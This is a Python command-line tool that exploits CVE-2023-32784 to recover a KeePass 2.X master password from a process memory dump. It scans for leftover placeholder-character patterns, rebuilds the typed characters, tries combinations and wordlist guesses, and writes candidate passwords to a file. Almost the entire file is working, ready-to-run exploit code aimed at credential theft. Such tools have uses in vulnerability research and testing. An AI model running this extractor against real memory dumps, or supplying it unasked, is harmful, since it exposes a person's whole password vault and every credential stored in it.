import argparse
from collections import deque, OrderedDict


def get_args():
    parser = argparse.ArgumentParser(
        description="Tool for extracting masterkey from a KeePass 2.X dump. (CVE-2023-32784)"
    )
    parser.add_argument(
        "--recover",
        action="store_true",
        default=False,
        help="Attempts to recover any remaining unknown characters using combinations of the found characters",
    )
    parser.add_argument(
        "-f", "--file", required=True, help="Path to the KeePass 2.X dump file"
    )
    parser.add_argument("-w", "--wordlist", help="Scan the dumpfile against a wordlist")
    parser.add_argument(
        "--skip",
        default=False,
        action="store_true",
        help="Attempt to jump to the next ● character (Useful for large files but may miss characters)",
    )
    parser.add_argument(
        "--set-skip",
        type=int,
        help="Change the number of bytes to skip when using --skip (default: 999 is when using --skip)",
    )
    parser.add_argument(
        "--full-scan",
        action="store_true",
        default=False,
        help="Full dump scan (slower but may find more characters)",
    )

    parser.add_argument(
        "-p",
        "--padding",
        default=0,
        type=int,
        help="Padding for wordlist search. (Ex: --padding 2 => ●●a | -- padding 3 => ●●●a)",
    )

    parser.add_argument(
        "-o", "--output", help="Output file to write masterkey combinations to"
    )
    parser.add_argument(
        "--debug", action="store_true", default=False, help="Print debug information"
    )
    return parser.parse_args()


class KeePassDump:
    def __init__(self, args):
        self.args = args
        with open(args.file, "rb") as f:
            self.mem_dump = f.read()
            self.size = len(self.mem_dump)

        self.combinations = deque()
        self.found = OrderedDict()
        if args.skip:
            print("[*] Skipping bytes")
            if args.set_skip:
                self._skip = args.set_skip
            else:
                self._skip = 999
        else:
            self._skip = 0

    def DumpPasswords(self):
        print("[*] Searching for masterkey characters")
        chars = self.dump_pw_chars()
        if chars:
            print(f"[*] Extracted: {{UNKNOWN}}{chars}")
            if self.args.recover:
                combos = get_word_combinations(chars, deque())
                for c in combos:
                    masterKey, found = self.recover(c)
                    if found:
                        print(f"[+] masterKey: {masterKey}")
                if self.args.output:
                    with open(self.args.output, "w") as f:
                        f.write("\n".join(combos) + "\n")
                    print(f"[*] Saved {len(combos)} combinations to {self.args.output}")
            return
        else:
            print("[-] couldn't find any characters")

    def WordSearch(self):
        print(f"[*] Searching for masterkey using {self.args.wordlist}")
        wordlist = build_wordlist(self.args)
        searchResults = self.search_dump(wordlist)
        if searchResults:
            [print(f"[+] masterKey: {x}") for x in searchResults]

    def dump_pw_chars(self) -> str:
        current_len = 0
        dbg_str = deque()
        found = OrderedDict()
        if self.args.full_scan:
            print(f"[*] Full scan... This may take a few seconds.")
            return self._full_scan(current_len, dbg_str, found)
        else:
            idx, endSearch = self.__get_jump_points()

        mem = self.mem_dump
        since_last_char = 0
        while idx < endSearch:
            # stop searching if we haven't found anything else to reduce false positives
            if found and since_last_char > 10000000:
                if self.args.debug:
                    print("[*] 10000000 bytes since last found. Ending scan.")
                break
            if isAsterisk(mem[idx], mem[idx + 1]):
                current_len += 1
                dbg_str.append("●")
                idx += 1
            elif current_len != 0:
                if isAscii(mem, idx):
                    if current_len not in found:
                        found[current_len] = bytes([mem[idx]])
                    elif mem[idx] not in found[current_len]:
                        found[current_len] += bytes([mem[idx]])

                    if self.args.debug:
                        print(
                            f"[*] {idx} | Found: {''.join(dbg_str)}{bytes([mem[idx]]).decode()}"
                        )
                    since_last_char = 0
                    idx += self._skip
                current_len = 0
                dbg_str.clear()
            idx += 1
            since_last_char += 1
        return self.display(found)

    def _full_scan(self, current_len, dbg_str, found):
        current_len = 0
        dbg_str = deque()
        found = OrderedDict()

        idx, endSearch = 0, self.size

        mem = self.mem_dump
        while idx < endSearch:
            if isAsterisk(mem[idx], mem[idx + 1]):
                current_len += 1
                dbg_str.append("●")
                idx += 1
            elif current_len != 0:
                if isAscii(mem, idx):
                    if current_len not in found:
                        found[current_len] = bytes([mem[idx]])
                    elif mem[idx] not in found[current_len]:
                        found[current_len] += bytes([mem[idx]])

                    if self.args.debug:
                        print(
                            f"[*] {idx} | Found: {''.join(dbg_str)}{bytes([mem[idx]]).decode()}"
                        )
                    since_last_char = 0
                    idx += self._skip
                current_len = 0
                dbg_str.clear()
            idx += 1
        return self.display(found)

    def display(self, found: OrderedDict) -> str:
        chars = []
        print("[*] 0:\t{UNKNOWN}")
        for key, val in found.items():
            print(f"[*] {key}:", end="\t")
            if len(val) > 1:
                candidates = b"<{" + b", ".join([c.to_bytes() for c in val]) + b"}>"
            else:
                candidates = val
            data = candidates.decode()
            print(data)
            chars.append(data)
        return "".join(chars)

    def recover(self, search_word: str, collected=[]) -> tuple[bool, str]:
        print("[?] Recovering...")

        if not collected:
            collected = deque([c for c in search_word])

        key, success = self.extract_and_search(search_word, collected)
        if success:
            return key, success

        return False, ""

    def extract_and_search(self, char: str, collected_key_chars: deque):
        idx = self.mem_dump.find(char.encode())
        if idx != -1:
            print(f"[*] Found match in dump for: {char}")
            key, found_ct = self.__extract_chars(idx, len(char), collected_key_chars)
            if found_ct != 0 and self.mem_dump.find(key.encode()) != -1:
                return key, True
            return "", False
        print(f"[-] Couldn't verify plaintext match in dump for: {char}")
        return "", False

    def search_dump(self, wordlist: dict[str, deque]) -> tuple[bool, str]:
        results = {}

        for idx, (word, patterns) in enumerate(wordlist.items()):
            print(f"[*] ({idx + 1}/{len(wordlist.keys())}): {word}")
            collected, success = self._pattern_search(patterns.copy())
            if success:
                char = "".join(collected).replace("●", "")
                print(f"[*] Found string: {char}")
                key, success = self.recover(char, collected)
                if success:
                    results[word] = key
            else:
                print(f"[-] no matches found for: {word}")

        return list(set(results.values()))

    def _char_search_left(self, patterns: deque, collected: OrderedDict) -> deque:
        if not patterns:
            return deque(sorted(set(collected.values())))

        target_char = patterns.pop()
        target_idx = self.mem_dump.find(target_char.encode("utf-16-le"))

        if target_idx != -1:
            collected[target_idx] = target_char
            if self.args.debug:
                print(f"[*] Match for: {target_char}")
            if target_idx - 2600 > 0:
                mem = self.mem_dump
                dbg_str = deque(maxlen=100)
                for i in range(1, 2500):
                    idx = target_idx - 2500 - i
                    if isAscii(mem, idx):
                        for y in range(1, 99, 2):
                            if isAsterisk(mem[idx - y - 1], mem[idx - y]):
                                dbg_str.append("●")
                            elif dbg_str:
                                char = mem[idx : idx + 1].decode()
                                self.__search_callback(
                                    idx, char, dbg_str, collected, patterns
                                )
                                break
                        dbg_str.clear()
        return self._char_search_left(patterns, collected)

    def _char_search_right(self, patterns: deque, collected: OrderedDict) -> deque:
        if not patterns:
            return deque(sorted(set(collected.values())))

        target_char = patterns.popleft()
        target_idx = self.mem_dump.find(target_char.encode("utf-16-le"))
        mem = self.mem_dump

        if target_idx != -1:
            collected[target_idx] = target_char
            if self.args.debug:
                print(f"[*] Match for: {target_char}")
            if target_idx - 2600 > 0:
                mem = self.mem_dump
                dbg_str = deque(maxlen=100)
                for i in range(1, 2500):
                    idx = target_idx + 2500 + i
                    if isAsterisk(mem[idx + 1], mem[idx + i + 1]):
                        dbg_str.append("●" * len(target_char))
                    if dbg_str:
                        for y in range(1, 99, 2):
                            if isAscii(mem, idx + y):
                                char = mem[idx + y : idx + y + 1].decode()
                                self.__search_callback(
                                    idx, char, dbg_str, collected, patterns
                                )
                                break
                        break
        return self._char_search_right(patterns, collected)

    def _pattern_search(self, patterns: deque):
        collected = deque()
        # copy we can use the original pattern in both searches
        _left_chars = self._char_search_left(patterns.copy(), OrderedDict())
        _right_chars = self._char_search_right(patterns.copy(), OrderedDict())

        if not _left_chars and not _right_chars:
            return collected, False

        # merge collected characters
        for i in range(len(_left_chars)):
            if _left_chars[i] not in _right_chars:
                _right_chars.insert(i, _left_chars[i])

        collected.extend(_right_chars)
        return collected, True

    def __search_callback(self, idx, char, dbg_str, collected, patterns):
        dbg_str = f'{"".join(dbg_str)}{char}'
        if dbg_str not in collected.values():
            collected[idx] = dbg_str
            if dbg_str not in patterns:
                if self.args.debug:
                    print(f"[*] Match for: {char}")
                patterns.append(dbg_str)

    def __extract_chars(self, start: int, chars_len: int, collected) -> str:
        """Extracts the remaining characters of the masterkey from the dump if they're stored in plaintext by being displayed within the application"""
        print("[*] Extracted chars:", end="\t")
        mem = self.mem_dump

        init_len = len(collected)
        last_len = init_len

        for i in range(1, 99 - chars_len):  # 99 => max length for masterkey
            if not 0x20 <= mem[start - i] <= 0x7E:
                break
            collected.appendleft(mem[start - i].to_bytes().decode())

        print("{ ", end="")

        if len(collected) == last_len:
            print("(none)", end="")
        else:
            [print(collected[x], end="") for x in range(len(collected) - last_len)]

        print(" <- -> ", end="")

        last_len = len(collected)

        for i in range(99 - chars_len):
            if not 0x20 <= mem[start + chars_len + i] <= 0x7E:
                if len(collected) == last_len:
                    print("(none)", end="")
                break
            char = mem[start + chars_len + i].to_bytes().decode()
            print(char, end="")
            collected.append(char)

        print(" }")

        if len(collected) == init_len:
            print("[-] No new chars found")
            return "".join(collected).replace("●", ""), 0

        return "".join(collected).replace("●", ""), len(collected) - init_len

    def __get_jump_points(self) -> tuple[int, int]:
        try:
            i = self.mem_dump.index(b"(Multiple values)")
            endSearch = self.mem_dump.rindex(b"(Multiple values)")
            if i != endSearch:
                print("[*] Using jump points")
                return i, endSearch
            print("Only one jump point found. Scanning with slower method.")
            return 0, len(self.mem_dump) - 1
        except:
            print("[-] Couldn't find jump points in file. Scanning with slower method.")
            return 0, len(self.mem_dump) - 1


def isAscii(mem_dump, idx) -> bool:
    return 0x20 <= mem_dump[idx] and mem_dump[idx] <= 0x7E and mem_dump[idx + 1] == 0x00


def isAsterisk(x, y) -> bool:
    return x == 0xCF and y == 0x25


def get_word_combinations(chars, combinations, current="") -> deque:
    if not chars:
        combinations.append(current)
        return

    if chars.startswith("<{") and "}>" in chars:
        opening_idx = chars.index("<{")
        closing_idx = chars.index("}>")
        options = chars[opening_idx + 2 : closing_idx].split(", ")
        for option in options:
            get_word_combinations(
                chars[closing_idx + 2 :], combinations, current + option
            )
    else:
        get_word_combinations(chars[1:], combinations, current + chars[0])

    return combinations


def build_wordlist(args) -> dict[str, deque]:
    with open(args.wordlist, "r") as f:
        wordlist = [line.strip() for line in f.readlines()]

    candidates: dict[str, deque] = {}

    for word in wordlist:
        candidates[word] = deque(
            [f"{'●' * (x + args.padding)}{word[x]}" for x in range(len(word))]
        )
    return candidates


def main(args):
    kpd = KeePassDump(args)

    if args.wordlist:
        kpd.WordSearch()
    else:
        kpd.DumpPasswords()


if __name__ == "__main__":
    main(get_args())
